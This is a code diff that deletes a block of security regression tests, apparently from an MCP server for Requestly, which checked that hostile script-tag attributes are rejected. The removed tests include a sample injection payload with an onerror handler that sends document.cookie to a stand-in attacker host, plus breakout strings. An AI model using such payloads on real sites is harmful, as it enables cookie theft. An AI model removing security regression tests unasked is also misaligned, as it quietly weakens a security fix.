@@ -5,11 +5,6 @@ import {
   resourceIdSchema,
   REQUESTLY_API_BASE,
 } from '../apiClient.js';
-import {
-  isSafeScriptAttributeName,
-  isSafeScriptAttributeValue,
-  ScriptModificationSchema,
-} from '../types/ruleSchemas.js';
 
 /**
  * Regression tests for the two MCP security fixes.
@@ -178,78 +173,5 @@ describe('RQ-3025 — upstream error bodies never reach LLM context', () => {
     const logged = errorSpy.mock.calls.flat().join(' ');
     expect(logged).toContain('SYSTEM:');
     expect(logged).toContain('400');
-  });
-});
-
-describe('RQ-3024 — script-tag attribute channel is closed', () => {
-  it('rejects every event-handler attribute, any case or padding', () => {
-    for (const bad of ['onerror', 'onload', 'OnError', 'ONERROR', ' onerror ', 'onanimationstart']) {
-      expect(isSafeScriptAttributeName(bad)).toBe(false);
-    }
-  });
-
-  it('rejects the source/navigation attributes named by the finding', () => {
-    for (const bad of ['src', 'SRC', ' src ', 'href', 'action', 'formaction']) {
-      expect(isSafeScriptAttributeName(bad)).toBe(false);
-    }
-  });
-
-  it('allows only the safe set plus data-*', () => {
-    for (const ok of ['defer', 'async', 'crossorigin', 'nonce', 'type', 'integrity', 'referrerpolicy',
-                      'data-tracker-id', 'data-x', 'DATA-Tracker-Id']) {
-      expect(isSafeScriptAttributeName(ok)).toBe(true);
-    }
-    // Allowlist, not denylist: an unknown attribute is refused by default.
-    for (const unknown of ['id', 'class', 'style', 'srcdoc', 'data', 'data-', 'dataset']) {
-      expect(isSafeScriptAttributeName(unknown)).toBe(false);
-    }
-  });
-
-  it('closes the value-side breakout — constraining name alone is not enough', () => {
-    // name="data-x" value='" onerror="…' would render
-    //   <script data-x="" onerror="…">  — the same bypass via the other field.
-    expect(isSafeScriptAttributeValue('" onerror="fetch(1)')).toBe(false);
-    for (const bad of ['"', "'", '<', '>', '`', 'a" b', "x' y"]) {
-      expect(isSafeScriptAttributeValue(bad)).toBe(false);
-    }
-    for (const ok of ['abc-123', 'module', 'anonymous', 'sha384-xyz+/=', 'no-referrer']) {
-      expect(isSafeScriptAttributeValue(ok)).toBe(true);
-    }
-  });
-
-  it('rejects the exact C-007 payload at the schema boundary', () => {
-    const payload = {
-      codeType: 'js', type: 'code', loadTime: 'afterPageLoad', value: '/* placeholder */',
-      attributes: [
-        { name: 'src', value: 'https://evil.example/x.js' },
-        { name: 'onerror', value: 'fetch("https://evil.example/c?d="+document.cookie)' },
-      ],
-    };
-    const result = ScriptModificationSchema.safeParse(payload);
-    expect(result.success).toBe(false);
-  });
-
-  it('still accepts a legitimate attribute set', () => {
-    const result = ScriptModificationSchema.safeParse({
-      codeType: 'js', type: 'code', loadTime: 'afterPageLoad', value: 'console.log(1)',
-      attributes: [{ name: 'defer', value: '' }, { name: 'data-tracker-id', value: 'abc-123' }],
-    });
-    expect(result.success).toBe(true);
-  });
-
-  // Both create_rule and update_rule reach ScriptAttributeSchema through the shared
-  // ScriptPairSchema, so one definition covers both — RQ-3024's "closure is total" bullet.
-  it('is enforced on the create AND update paths', async () => {
-    const hostile = {
-      source: { key: 'Url', operator: 'Contains', value: 'x' },
-      scripts: [{
-        codeType: 'js', type: 'code', loadTime: 'afterPageLoad', value: '/* x */',
-        attributes: [{ name: 'onerror', value: 'alert(1)' }],
-      }],
-    };
-    const { ruleSchema: createSchema } = await import('../types/createRuleSchemas.js');
-    const { ruleSchema: updateSchema } = await import('../types/updateRuleSchemas.js');
-    expect(createSchema.safeParse({ name: 'x', ruleType: 'Script', pairs: [hostile] }).success).toBe(false);
-    expect(updateSchema.safeParse({ ruleId: 'r1', ruleType: 'Script', pairs: [hostile] }).success).toBe(false);
   });
 });
